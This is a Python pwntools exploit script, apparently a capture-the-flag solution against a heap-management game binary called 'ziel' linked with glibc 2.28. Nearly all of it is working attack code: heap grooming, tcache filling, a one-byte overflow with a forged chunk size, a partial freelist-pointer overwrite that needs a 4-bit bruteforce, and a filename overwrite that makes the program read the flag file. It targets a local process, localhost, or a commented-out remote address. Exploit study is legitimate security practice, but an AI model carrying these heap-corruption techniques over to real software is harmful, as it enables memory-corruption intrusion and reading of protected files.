#!/usr/bin/python

from pwn import *

def setup_game(w,h,savename=''):
	r.sendlineafter("code: ",savename)
	r.sendlineafter("Width: ",str(w))
	r.sendlineafter("Height: ",str(h))

def move():
	r.sendlineafter("> ",'1')

def spawn(ID,sx,sy,vx,vy,len,desc):
	r.sendlineafter("> ",'2')
	r.sendlineafter("X: ",str(sx))
	r.sendlineafter("Y: ",str(sy))
	r.sendlineafter("ID: ",ID)
	r.sendlineafter("X: ",str(vx))
	r.sendlineafter("Y: ",str(vy))
	r.sendlineafter("length: ",str(len-11))
	r.sendlineafter("Description: ",desc[:len-11])

def kill(x,y):
	r.sendlineafter("> ",'3')
	r.sendlineafter("X: ",str(x))
	r.sendlineafter("Y: ",str(y))

def save():
	r.sendlineafter("> ",'4')

def load():
	r.sendlineafter("> ",'5')

def restart(w,h,savename=''):
	r.sendlineafter("> ",'6')
	setup_game(w,h,savename)

def exploit():
	setup_game(160,1,"wtf")

	log.info("allocating 0xa0 and 0x90 chunks")
	for i in xrange(14):
		spawn(chr(0x61+i),0x30+i,0,0,0,0x98 if i < 7 else 0x88,chr(0x61+i)*8)

	spawn('?',0x30+14,0,0,0,0x98,'?'*8)
	spawn('*',0x30+15,0,0,0,0x48,'*'*8)
	spawn('*',0x30+16,0,0,0,0x48,'*'*8)
	spawn('*',0x30+17,0,0,0,0x48,'*'*8)
	spawn('*',0x30+18,0,0,0,0x48,'*'*8)
	spawn('x',0x30+19,0,0,0,0x88,'x'*8)
	spawn('=',0x30+20,0,0,0,0x28,'='*8)

	log.info("filling tcache for 0xa0 and 0x90 chunks")
	for i in xrange(14): kill(0x30+i,0)

	log.info("freeing payload chunk")
	kill(0x30+18,0)

	log.info("adjusting fake size")
	log.info("triggering one byte overflow")
	payload = ''.ljust(0x3d-9,'+')
	payload += p64(0xa0+0x50+0x50+0x50+0x50)
	payload += p64(0x90)
	spawn('+',0x30+28,0,0,0,0x48,payload)

	log.info("freeing coalesce target")
	kill(0x30+14,0)

	a(r)

	log.info("coalescing chunk")
	kill(0x30+19,0)

	log.info("fill 0x50 tcache")
	kill(0x30+16,0)
	kill(0x30+15,0)

	spawn('?',0x30+40,0,0,0,0x78,'?'*8)

	log.info("partial overwrite fd")
	payload = p32(0)
	payload += p64(0xa0)
	payload += p64(0x50)
	payload += p16(0x6240)
	spawn('P',0x30+41,0,0,0,0x58,payload)

	spawn('A',0x30+42,0,0,0,0x48,"wtf")
	log.info("overwriting filename")

	payload = "wtf?"
	payload += p64(0)
	payload += p64(0)
	payload += "/home/ziel/flag\x00" if len(sys.argv) > 2 else "./flag\x00"
	spawn('Y',0x30+43,0,0,0,0x48,payload)

	log.info("spawning flag")
	load()
	move()
	
	r.recvuntil('|')
	flag = r.recvuntil('}',timeout=1)
	if flag == '':
		log.warning("4 bit bruteforce failed, try running exploit again")
	else:
		log.success("Flag: {}".format(flag))

	r.sendlineafter("> ","bye")
	
exe = ELF("./ziel")
libc = ELF("./libc-2.28.so",checksec=False)


a = lambda r: gdb.attach(r,"""
	b *0x15555531d9f5
	b *0x15555531db23
	b *0x15555531ce0d
	b *0x15555531cc14
	b *0x15555531d199
	c
""") if len(sys.argv) < 2 else False

if len(sys.argv) < 2:
	r = process(["./ld-2.28.so",exe.path],aslr=False,env={"LD_PRELOAD":libc.path})
else:
	# r = remote("34.87.70.206",10004)
	r = remote("localhost",10004)

exploit()
